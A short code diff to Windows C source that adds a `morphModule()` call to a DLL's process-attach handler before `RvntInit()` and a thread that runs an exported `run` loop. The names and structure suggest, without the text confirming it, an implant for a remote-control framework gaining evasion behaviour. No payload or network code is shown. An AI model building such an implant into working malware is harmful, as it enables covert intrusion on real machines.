@@ -28,14 +28,14 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 }
 
 #elif CONFIG_MAKE == 1
-__declspec(dllexport) void run();
+__declspec(dllexport) VOID run();
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved){
 
     switch (ul_reason_for_call){
 
         case DLL_PROCESS_ATTACH:
-
+            morphModule();
             RvntInit();
 
             CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) run, NULL, 0, NULL);
@@ -49,7 +49,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpRese
     return TRUE;
 }
 
-__declspec(dllexport) void run(){
+__declspec(dllexport) VOID run(){
 
     do {
 
